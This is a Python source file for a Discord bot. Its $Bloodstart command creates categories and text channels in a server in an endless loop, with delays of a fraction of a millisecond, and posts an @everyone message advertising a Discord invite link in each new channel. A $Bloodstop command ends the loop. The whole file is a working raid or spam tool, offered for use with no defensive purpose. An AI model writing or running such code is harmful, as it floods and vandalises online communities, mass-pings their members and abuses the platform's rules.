import discord
from discord.ext import commands
import asyncio
import os

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="$", intents=intents)

running_loops = {}

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

@bot.command()
async def Bloodstart(ctx, delay: float = 0.0002):
    guild = ctx.guild

    if not guild.me.guild_permissions.manage_channels:
        await ctx.send("❌ I don't have permission to manage channels.")
        return

    if guild.id in running_loops:
        await ctx.send("⚠️ Blood creation is already running.")
        return

    running_loops[guild.id] = True
    await ctx.send("🩸 Unlimited blood category creation has started!")

    count = 1

    while guild.id in running_loops:
        category = await guild.create_category(f"🩸 BLOOD CATEGORY {count}")

        messages = [
            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone  !"
        ]

        for i in range(5):
            if guild.id not in running_loops:
                break

            channel = await guild.create_text_channel(
                f"bloodtime-{i+1}",
                category=category
            )
            await channel.send(messages[i])
            await asyncio.sleep(0.000001)

        count += 1
        await asyncio.sleep(delay)

@bot.command()
async def Bloodstop(ctx):
    guild = ctx.guild
    if guild.id in running_loops:
        running_loops.pop(guild.id)
        await ctx.send("🛑 Blood creation STOPPED.")
    else:
        await ctx.send("⚠️ Blood creation is not running.")

bot.run(TOKEN)

